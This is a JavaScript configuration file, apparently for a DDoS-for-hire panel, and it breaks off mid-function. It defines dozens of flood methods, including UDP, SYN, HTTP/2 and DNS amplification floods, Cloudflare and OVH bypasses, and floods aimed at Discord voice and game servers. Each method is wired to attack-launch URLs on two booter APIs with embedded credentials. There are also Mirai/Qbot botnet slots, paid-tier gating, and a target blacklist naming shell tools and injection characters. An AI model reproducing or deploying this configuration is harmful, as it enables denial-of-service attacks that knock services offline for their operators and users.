export const DEFAULT_PAYLOAD = {
  note: 'CAPI default attack payload configuration',
  blacklists: {
    Blacklists_Targets: [
      '0.0.0.', '1.1.1.', '127.0.0.', '8.8.8.', '.gov', '.edu', '.gouv', 'curl', 'wget', 'echo', 'reboot', 'whoami', 'nano', 'mysql', 'localhost', 'bash', 'root', 'proc', 'apache2', 'sudo', 'bin', 'etc', '\\u', '.sh', '%0', '%1', '%20', '%21', '%22', '%24', '%25', '%27', '%28', '%29', '%2a', '%2b', '%2c', '%2d', '%2e', '%2f', '%3b', '%3c', '%3e', ';', '|', '[', ']', '<', '>', '{', '}', '+', '!', '~', '"', '\\', '$', '@', '(', ')', '`'
    ],
    ASN_NUMBER: ['AS16271'],
    ASN_NAME: ['OVH-SASS'],
    Countries: ['RU']
  },
  server_list: [
    { note: 'Layer 4 attack server', enabled: false, tag: 'LAYER 4 #1', server_config: { ip: '1.1.1.1', port: 22, username: 'root', password: 'password' } },
    { note: 'Layer 7 attack server', enabled: false, tag: 'LAYER 7 #1', server_config: { ip: '1.1.1.1', port: 22, username: 'root', password: 'password' } }
  ],
  bots_list: [
    { note: 'Mirai bot', enabled: false, tag: 'LAYER 4 Mirai #1', server_config: { ip: '1.1.1.1', port: 22, username: 'root', password: 'password' } },
    { note: 'Qbot', enabled: false, tag: 'LAYER 7 Qbot #1', server_config: { ip: '1.1.1.1', port: 22, username: 'root', password: 'password' } }
  ],
  methods: [
    // === LAYER 4: UDP Methods ===
    {
      name: 'udp',
      description: 'UDP flood method',
      enabled: true,
      default_access: 1,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=udp', method: 'GET' },
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method=udp', method: 'GET' }
      ]
    },
    {
      name: 'udp-flood',
      description: 'UDP flood variant',
      enabled: false,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' },
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=tcp', method: 'GET' }
      ]
    },
    {
      name: 'udpbypass',
      description: 'High rate udp flood sending different bypasses with high pps',
      enabled: false,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=tcpbypass', method: 'GET' },
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method=udpbypass', method: 'GET' }
      ]
    },
    {
      name: 'pps-vip',
      description: 'Raw PPS flood using default len=1 + bots=1000',
      enabled: true,
      default_access: 1,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: true, holder: false },
      api_links: [
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=discord', method: 'GET' },
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' }
      ]
    },
    {
      name: 'udp-vip',
      description: 'Mixed udpplain & spoof flood using custom parameters',
      enabled: true,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: true, holder: false },
      api_links: [
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=fivem', method: 'GET' },
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' }
      ]
    },


    {
      name: 'udp-pps',
      description: 'Method udp-pps',
      enabled: true,
      default_access: 1,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=udp-pps', method: 'GET' },
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' }
      ]
    },

    {
      name: '!http',
      description: 'Method !http',
      enabled: true,
      default_access: 1,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=!http', method: 'GET' },
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' }
      ]
    },

    {
      name: '!pps',
      description: 'Method !pps',
      enabled: true,
      default_access: 1,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=!pps', method: 'GET' },
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' }
      ]
    },

    {
      name: '!tcp',
      description: 'Method !tcp',
      enabled: true,
      default_access: 1,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=!tcp', method: 'GET' },
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' }
      ]
    },

    {
      name: '!udp',
      description: 'Method !udp',
      enabled: true,
      default_access: 1,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=!udp', method: 'GET' },
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' }
      ]
    },

    {
      name: 'bypass',
      description: 'Method bypass',
      enabled: true,
      default_access: 1,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=bypass', method: 'GET' },
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' }
      ]
    },

    {
      name: 'cloudflare',
      description: 'Method cloudflare',
      enabled: true,
      default_access: 1,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=cloudflare', method: 'GET' },
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' }
      ]
    },

    {
      name: 'homehold',
      description: 'Method homehold',
      enabled: true,
      default_access: 1,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=homehold', method: 'GET' },
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' }
      ]
    },

    {
      name: 'httpsbypass',
      description: 'Method httpsbypass',
      enabled: true,
      default_access: 1,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=httpsbypass', method: 'GET' },
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' }
      ]
    },

    {
      name: 'ovh-priv',
      description: 'Method ovh-priv',
      enabled: true,
      default_access: 1,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=ovh-priv', method: 'GET' },
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' }
      ]
    },

    {
      name: 'spam-udp',
      description: 'Method spam-udp',
      enabled: true,
      default_access: 1,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=spam-udp', method: 'GET' },
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' }
      ]
    },

    {
      name: 'spoof-udp',
      description: 'Method spoof-udp',
      enabled: true,
      default_access: 1,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=spoof-udp', method: 'GET' },
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' }
      ]
    },

    {
      name: 'tls-free',
      description: 'Method tls-free',
      enabled: true,
      default_access: 1,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=tls-free', method: 'GET' },
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' }
      ]
    },

    {
      name: 'udp-free',
      description: 'Method udp-free',
      enabled: true,
      default_access: 1,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=udp-free', method: 'GET' },
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' }
      ]
    },
    // === LAYER 4: TCP Methods ===
    {
      name: 'tcp',
      description: 'TCP flood method',
      enabled: true,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method=tcp', method: 'GET' },
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=game', method: 'GET' }
      ]
    },
    {
      name: 'tcp-flood',
      description: 'TCP flood variant',
      enabled: false,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' },
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=ovh', method: 'GET' }
      ]
    },
    {
      name: 'tcpbypass',
      description: 'Sending Legit TCP Data + randomized SYN Flags',
      enabled: false,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method=tcpbypass', method: 'GET' },
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=http', method: 'GET' }
      ]
    },
    {
      name: 'tcp-vip',
      description: 'Raw TCP flood sending randomized flags & low len',
      enabled: false,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: true, holder: false },
      api_links: [
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' },
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=browser', method: 'GET' }
      ]
    },

    // === LAYER 7: HTTP Methods ===
    {
      name: 'http',
      description: 'HTTP flood method',
      enabled: false,
      target_type: 'url',
      default_port: 443,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method=http', method: 'GET' },
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=tls', method: 'GET' }
      ]
    },
    {
      name: 'http-raw',
      description: 'Raw HTTP flood method',
      enabled: false,
      target_type: 'url',
      default_port: 443,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' },
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=udpbypass', method: 'GET' }
      ]
    },
    {
      name: 'http-flood',
      description: 'HTTP flood variant',
      enabled: false,
      target_type: 'url',
      default_port: 443,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' },
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method={method}', method: 'GET' }
      ]
    },
    {
      name: 'https',
      description: 'HTTPS flood method',
      enabled: true,
      default_access: 1,
      target_type: 'url',
      default_port: 443,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' },
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method={method}', method: 'GET' }
      ]
    },
    {
      name: 'https-raw',
      description: 'Raw HTTPS flood method',
      enabled: true,
      target_type: 'url',
      default_port: 443,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' },
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method={method}', method: 'GET' }
      ]
    },
    {
      name: 'stoomp',
      description: 'Legit TCP Data + randomized proxied SYN / DATA Variants',
      enabled: true,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' },
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method={method}', method: 'GET' }
      ]
    },
    {
      name: 'ovh',
      description: 'Valid OVH bypass using PSH, ACK & proxied 3 way handshake',
      enabled: true,
      default_access: 1,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method=ovh', method: 'GET' },
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=ovh', method: 'GET' }
      ]
    },
    {
      name: 'socket',
      description: 'Valid TCP flood for MASS open connections low GBPs',
      enabled: true,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' },
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method={method}', method: 'GET' }
      ]
    },
    {
      name: 'tfo',
      description: 'Sending Fast Open Cookie Flood + randomized options',
      enabled: false,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' },
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method={method}', method: 'GET' }
      ]
    },
    {
      name: 'discord',
      description: 'Custom UDP payload based for DISCORDS VOIP servers',
      enabled: true,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method=discord', method: 'GET' },
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=discord', method: 'GET' }
      ]
    },
    {
      name: 'fivem',
      description: 'Dynamic Query AUTH flood using static login tokens',
      enabled: true,
      default_access: 1,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method=fivem', method: 'GET' },
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=fivem', method: 'GET' }
      ]
    },
    {
      name: 'game',
      description: 'Custom UDP flood designed for all games sending low packets',
      enabled: true,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method=game', method: 'GET' },
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=game', method: 'GET' }
      ]
    },
    {
      name: 'browser',
      description: 'HTTP/2 Cookie cloudflare bypass EXPLOIT = 0% HTTP-DDOS, emulation',
      enabled: true,
      target_type: 'url',
      default_port: 443,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method=browser', method: 'GET' },
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=browser', method: 'GET' }
      ]
    },
    {
      name: 'tls',
      description: 'Node.js HTTP/2 flood using TLS queries w randomized user agents',
      enabled: true,
      default_access: 1,
      target_type: 'url',
      default_port: 443,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method=tls', method: 'GET' },
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=tls', method: 'GET' }
      ]
    },

    // === Specialized Methods ===
    {
      name: 'cf-bypass',
      description: 'Cloudflare bypass method',
      enabled: true,
      default_access: 1,
      target_type: 'url',
      default_port: 443,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: true, holder: false },
      api_links: [
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method=h2-reverb', method: 'GET' },
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method={method}', method: 'GET' }
      ]
    },
    {
      name: 'dns',
      description: 'DNS amplification method',
      enabled: true,
      target_type: 'url',
      default_port: 53,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: true, holder: false },
      api_links: [
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' },
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method={method}', method: 'GET' }
      ]
    },

    // === Other Protocols ===
    {
      name: 'icmp',
      description: 'ICMP flood method',
      enabled: true,
      target_type: 'ip',
      default_port: 0,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' },
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method={method}', method: 'GET' }
      ]
    },
    {
      name: 'syn',
      description: 'SYN flood method',
      enabled: true,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: true, holder: false },
      api_links: [
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' },
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method={method}', method: 'GET' }
      ]
    },
    {
      name: 'ack',
      description: 'ACK flood method',
      enabled: true,
      default_access: 1,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' },
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method={method}', method: 'GET' }
      ]
    },
    {
      name: 'slowloris',
      description: 'Slowloris style method',
      enabled: false,
      target_type: 'url',
      default_port: 443,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' },
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method={method}', method: 'GET' }
      ]
    },
    {
      name: 'raw',
      description: 'Raw payload method',
      enabled: false,
      target_type: 'url',
      default_port: 443,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' },
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method={method}', method: 'GET' }
      ]
    }
  ]
};

export function getPayloadMethods() {
  return DEFAULT_PAYLOAD.methods || [];
}

export function getPayloadBlacklists() {
  return DEFAULT_PAYLOAD.blacklists || {};
}

export function getPayloadServers() {
